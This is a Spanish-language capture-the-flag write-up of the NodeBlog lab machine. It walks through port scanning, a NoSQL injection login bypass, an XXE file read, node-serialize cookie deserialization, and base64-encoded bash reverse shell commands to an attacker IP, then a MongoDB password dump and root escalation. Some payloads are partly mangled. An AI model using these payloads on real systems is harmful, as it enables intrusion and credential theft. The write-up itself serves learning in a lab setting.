@@ -1,0 +1,185 @@
+---
+title: 'CTF - NodeBlog WriteUP'
+date: '2022-02-01'
+tags: ["#Import 2022-12-20 21:06"]
+draft: true
+authors: ['default']
+summary: nmap me cuesta descubrir cosas He tenido que ralentizar el comando de descubrir todos los pueortos 
+---
+
+nmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal
+
+
+```
+nmap -p- --open -sT -vvv -n -Pn 10.10.11.139 -oG allPorts
+```
+y despues
+
+
+```
+nmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted
+# Scanned at 2022-02-01 20:20:50 CET for 15s
+# PORT     STATE SERVICE REASON         VERSION
+# 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+# | ssh-hostkey: 
+# |   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+# | ssh-rsa
+# |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=
+# |   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
+# 5000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
+# |_http-title: Blog
+# | http-methods: 
+# |_  Supported Methods: GET HEAD POST OPTIONS
+# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Foto
+
+![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_2.png)Tiene un login.
+
+Probamos sqlmap y no tiene inyecciones sql.
+
+
+```
+❯ curl -X POST nodeblog.htb:5000/login -H "Content-Type: application/json" -d "this is not a json"
+
+
+
+
+
+Error
+
+
+
+```
+SyntaxError: Unexpected token t in JSON at position 0  
+ &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)  
+ &nbsp; &nbsp;at createStrictSyntaxError (/opt/blog/node_modules/body-parser/lib/types/json.js:158:10)  
+ &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:83:15)  
+ &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18  
+ &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)  
+ &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)  
+ &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)  
+ &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)  
+ &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)  
+ &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)
+```
+
+
+
+
+```
+Esta intentando parsear json. nosql injection?
+
+
+```
+❯ curl -X POST nodeblog.htb:5000/login -H "Content-Type: application/json" -d "{\"user\":,\"password\":{\"\$gt\":\"\"}}"
+# funciona
+```
+Con burpsuite/repeater prueblo a hacer la llamada y mando al navegador la sesion iniciada
+
+fotos de burpsuite y el boton upload
+
+Subo un archivo normal y me sale esto si veo el html
+
+
+```
+Invalid XML Example: 
+
+ Example Post
+ Example Description
+ Example Markdown
+
+```
+Veo que se pueden escribir articulos con 
+
+* title
+* description
+* markdown
+
+Me genero un xml 
+
+
+```
+
+hola
+aaa
+md
+
+```
+Y me lleva a la ventana de articulo con todo relleno.
+
+Encuentro informacion sobre una vulnerabilidad de XML External entity (https://hackmd.io/@Chivato/rkSqk9gbL) y veo que se puede ejecutar codigo
+
+
+```
+xml version="1.0" encoding="ISO-8859-1"? 
+ ]
+
+hola
+aaa
+&xxe;
+
+```
+![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_4.png)Es vulnerable. Modifico el script para probar otras cosas.
+
+Me acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog
+
+Encuentro que un archivo tipico de nodejs es el server.js e imprimo su contenido /opt/blog/server.js
+
+Veo que usa node-serializer [https://snyk.io/test/npm/node-serialize#:~:text=node-serialize serializes an object,into the unserialize() function](https://snyk.io/test/npm/node-serialize#:~:text=node%2Dserialize%20serializes%20an%20object,into%20the%20unserialize()%20function).
+
+En server.js veo que el serializador parsea la cookie y la vulnerabilidad esta en que en la cookie puedes poner codigo que ejecuta el programa.
+
+con burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como hay serializaciones y demas, escribo el codigo en base64 intentando que no haya ni '+' ni '=' poniendo espacios.
+
+
+```
+❯ echo -n "bash -i & /dev/tcp/10.10.14.9/443 0&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx
+❯ echo -n "bash -i  & /dev/tcp/10.10.14.9/443 0&1" | base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==
+❯ echo -n "bash -i  & /dev/tcp/10.10.14.9/443  0&1" | base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=
+❯ echo -n "bash -i  &  /dev/tcp/10.10.14.9/443  0&1" | base64
+YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx
+
+# Copio el siguiente código en la cookie de burpsuite
+# echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash
+```
+![](https://blog.ikerocio.com/content/images/2022/02/Screenshot\_5.png)Antes de enviarlo, codifico el contenido de auth= a URLEncoding
+
+Me pongo en esuccha en mi equipo con netcat y estoy dentro.
+
+Entramos a mongodb y buscamos informacion del usuario
+
+
+```
+❯ admin@nodeblog:/opt/blog$ mongo 127.0.0.1
+❯ show databases
+admin   0.000GB
+blog    0.000GB
+config  0.000GB
+local   0.000GB
+❯ use blog
+switched to db blog
+❯ show collections
+articles
+users
+❯ db.users.find()
+{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
+```
+Tenemos la contraseña. Vamos a probar a ejecutar 
+
+
+```
+❯admin@nodeblog:/opt/blog$ sudo su -
+[sudo] password for admin: 
+❯ root@nodeblog:~# whoami
+root
+❯ root@nodeblog:~# cat /home/admin/user.txt
+e83b0edb016a7146e2e5aa00f4416730
+❯ root@nodeblog:~# cat root.txt
+b38f827567b54906d52439592c719952
+```
